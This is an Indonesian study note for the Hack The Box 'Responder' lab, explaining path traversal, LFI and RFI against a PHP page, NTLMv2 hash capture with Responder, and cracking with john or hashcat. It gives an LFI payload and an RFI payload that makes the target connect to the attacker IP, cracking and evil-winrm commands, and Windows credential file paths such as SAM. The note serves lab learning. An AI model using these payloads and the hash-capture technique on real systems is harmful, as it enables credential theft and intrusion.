```
=== HTB Starting Point - Responder ===
[09 Mei 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 KONSEP UTAMA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Target   : Windows machine (Apache + PHP + WinRM)
Alur     : Recon → LFI → RFI → Tangkap Hash → Crack → Login → Flag
Pelajaran: Path Traversal, LFI, RFI, NTLM Hash Capture, Password Cracking

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 VIRTUAL HOST & /etc/hosts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Masalah  : Domain seperti unika.htb tidak bisa di-resolve browser
           karena bukan domain publik — hanya ada di jaringan HTB
Solusi   : Daftarkan manual di /etc/hosts agar OS tau IP-nya

Tambah entry baru:
  echo "10.129.26.105  unika.htb" | sudo tee -a /etc/hosts

Cek isi file:
  cat /etc/hosts

Ganti IP lama (kalau IP target berubah):
  sudo sed -i '/unika.htb/d' /etc/hosts
  echo "10.129.X.X  unika.htb" | sudo tee -a /etc/hosts

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TEKNIK & VULNERABILITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Path Traversal
  → Teknik memakai ../ untuk keluar dari direktori yang seharusnya
  → Setiap ../ = naik satu folder ke atas
  → Kalau sudah di root, tambahan ../ diabaikan sistem
  → Trik aman: pakai banyak ../ sekaligus (misal 8x) biar pasti nyampe root

LFI (Local File Inclusion)
  → Vulnerability: parameter bisa dipakai load file LOKAL di server target
  → Tekniknya: Path Traversal via parameter URL
  → Perspektif: "lokal" = dari sisi SERVER TARGET, bukan laptop kita
  → Contoh eksploitasi:
    page=../../../../../../windows/system32/drivers/etc/hosts

RFI (Remote File Inclusion)
  → Vulnerability: parameter bisa dipakai load file dari server LUAR (kita)
  → Perspektif: server target "pergi ambil file" ke mesin kita
  → Di mesin Responder: LFI adalah pintu masuknya, RFI senjata utamanya
  → Contoh eksploitasi:
    page=//10.10.14.180/somefile

Perbedaan LFI vs RFI:
  LFI = server ambil file dari lemari dia sendiri
  RFI = server ambil file dari rumah kita (attacker)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 NTLM & HASH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NTLM     : New Technology LAN Manager
           Protokol autentikasi milik Microsoft
           Password di-hash dulu, hash itulah yang dikirim saat autentikasi
           Tidak bisa di-decode balik — harus di-crack

NTLMv2   : Versi lebih baru dan aman dari NTLM
           Yang tertangkap Responder = NTLMv2 hash

Cara Windows kirim hash:
  Setiap kali Windows coba akses network share,
  dia otomatis kirim NTLMv2 hash sebagai autentikasi
  → Inilah yang kita manfaatkan!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TOOLS & SWITCH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ NMAP ]
  nmap -sV -sC -p- --min-rate 5000 <IP>
  -sV          : deteksi versi service
  -sC          : jalankan default scripts
  -p-          : scan semua port (1-65535)
  --min-rate   : kecepatan minimum paket per detik

[ RESPONDER ]
  sudo responder -I tun0 -v
  -I <interface> : interface jaringan yang dipakai listening
  -v             : verbose mode, tampilkan semua detail
  Fungsi: jadi server palsu (SMB, HTTP, dll) untuk tangkap hash
  Log tersimpan di: /usr/share/responder/logs/

[ JOHN THE RIPPER ]
  john -w=<wordlist> <file_hash>
  -w=<path>    : wordlist yang dipakai untuk crack
  Kelebihan: deteksi jenis hash otomatis, ramah pemula
  Format hasil: password (username)

[ HASHCAT ]
  hashcat -m 5600 <file_hash> <wordlist>
  -m 5600      : mode NTLMv2 hash (harus tahu nomor mode)
  -O           : optimized kernel (lebih cepat, password pendek)
  Kelebihan: jauh lebih cepat (pakai GPU)
  Format hasil: hash_panjang:password (password di paling akhir)

[ EVIL-WINRM ]
  evil-winrm -i <IP> -u <user> -p <password>
  -i           : IP/host target
  -u           : username
  -p           : password
  Fungsi: remote shell ke Windows via protokol WinRM (port 5985)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 DOMAIN KNOWLEDGE WINDOWS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Path penting yang wajib hapal di Windows:
  C:\Windows\System32\drivers\etc\hosts  → DNS lokal
  C:\Windows\System32\config\SAM         → database password
  C:\Windows\win.ini                     → config lama Windows
  C:\Users\<user>\Desktop\               → tempat flag CTF

Port penting Windows:
  80   → HTTP
  443  → HTTPS
  445  → SMB
  5985 → WinRM (HTTP)
  5986 → WinRM (HTTPS)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 POWERSHELL CHEATSHEET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
dir              = ls (list isi folder)
cd <folder>      = pindah folder
Set-Location     = cd (versi panjang)
Get-Location     = pwd (cek posisi sekarang)
cat <file>       = baca isi file

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ROCKYOU.TXT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Apa itu  : Wordlist legendaris berisi 14 juta password
Asal     : Bocor dari breach RockYou tahun 2009
Lokasi   : /usr/share/wordlists/rockyou.txt
Extract  : sudo gunzip /usr/share/wordlists/rockyou.txt.gz

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
tun0         = interface VPN HTB di Kali
UNC Path     = format path jaringan Windows: //IP/folder
WinRM        = Windows Remote Management, protokol remote akses Windows
Hash Crack   = tebak password dari hashnya pakai wordlist (bukan decode!)
LLMNR        = Link-Local Multicast Name Resolution, protokol yang dieksploitasi Responder
SMB          = Server Message Block, protokol file sharing Windows
Virtual Host = domain yang hanya ada di jaringan lokal/private
```